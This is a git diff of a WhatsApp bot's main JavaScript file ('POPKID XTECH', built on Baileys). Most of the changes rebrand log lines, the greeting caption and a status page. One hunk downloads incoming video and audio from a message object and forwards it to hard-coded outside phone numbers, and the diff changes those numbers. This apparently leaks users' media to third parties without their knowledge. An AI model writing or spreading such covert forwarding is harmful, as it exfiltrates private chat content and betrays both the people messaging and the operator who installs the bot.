@@ -80,7 +80,7 @@ console.log("Session downloaded ✅")
   //=============================================
   
   async function connectToWA() {
-  console.log("Connecting POPKID-XTECH to WhatsApp ⏳️...");
+  console.log("Connecting popkid to WhatsApp ⏳️...");
   const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
   var { version } = await fetchLatestBaileysVersion()
   
@@ -100,7 +100,7 @@ console.log("Session downloaded ✅")
   connectToWA()
   }
   } else if (connection === 'open') {
-  console.log('🧬 Installing POPKID XTECH Plugins')
+  console.log('🧬 Installing  popkid Plugins')
   const path = require('path');
   fs.readdirSync("./plugins/").forEach((plugin) => {
   if (path.extname(plugin).toLowerCase() == ".js") {
@@ -110,7 +110,7 @@ console.log("Session downloaded ✅")
   console.log('Plugins installed successful ✅')
   console.log('Bot connected to whatsapp ✅')
   
-  let up = `*Hello there 😇 POPKID XTECH 😇 User! \ud83d\udc4b\ud83c\udffb* \n\n> This is auser friendly whatsapp bot created by POPKID. \ud83c\udf8a, Meet 😇 POPKID XTECH 😇 WhatsApp Bot.\n\n *Thanks for using 😇 POPKID 😇 XTECH BOT 😇 \ud83d\udea9* \n\n> follow WhatsApp Channel :- 💖\n \nhttps://whatsapp.com/channel/0029VadQrNI8KMqo79BiHr3l\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/Popkiddevs/POPKID-XTECH\n\n> © Powered BY 😇 POPKID 😇 XTECH 😇 \ud83d\udda4`;
+  let up = `*Hello there ✦ popkid ✦ Xtech ✦ MD ✦ User! \ud83d\udc4b\ud83c\udffb* \n\n> This is auser friendly whatsapp bot created by Popkid Tech Inc \ud83c\udf8a, Meet ✦ Popkid ✦ Xtech ✦ MD ✦ WhatsApp Bot.\n\n *Thanks for using ✦ Popkid ✦ Xtech ✦ MD ✦ \ud83d\udea9* \n\n> follow WhatsApp Channel :- 💖\n \nhttps://whatsapp.com/channel/0029VadQrNI8KMqo79BiHr3l\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/Popkiddevs/POPKID-XTECH\n\n> © Powered BY ✦ Popkid ✦ Xtech ✦ MD ✦ \ud83d\udda4`;
   conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/w5xf3f.jpg` }, caption: up })
   }
   })
@@ -148,10 +148,10 @@ console.log("Session downloaded ✅")
   } if (jawadik.message.videoMessage) {
     let cap = jawadik.message.videoMessage.caption;
     let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.videoMessage);
-    return conn.sendMessage("254111385747@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
+    return conn.sendMessage("254732297194@s.whatsapp.net", { video: { url: anu }, caption: cap }, { quoted: mek });
   } if (jawadik.message.audioMessage) {
     let anu = await conn.downloadAndSaveMediaMessage(jawadik.message.audioMessage);
-    return conn.sendMessage("254111385747@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
+    return conn.sendMessage("254756466053@s.whatsapp.net", { audio: { url: anu }, caption: cap }, { quoted: mek });
   }
   }
   const m = sms(conn, mek)
@@ -526,9 +526,9 @@ console.log("Session downloaded ✅")
          
   //================ownerreact==============
   
-  if(senderNumber.includes("254111385747")){
+  if(senderNumber.includes("254700143167")){
   if(isReact) return
-  m.react("😇")
+  m.react("🦄")
   }
   
   //==========public react============//
@@ -612,7 +612,7 @@ if (!isReact && senderNumber === botNumber) {
   }
   
   app.get("/", (req, res) => {
-  res.send("POPKID XTECH RUNNING ✅");
+  res.send("popkid xtech RUNNING ✅");
   });
   app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
   setTimeout(() => {
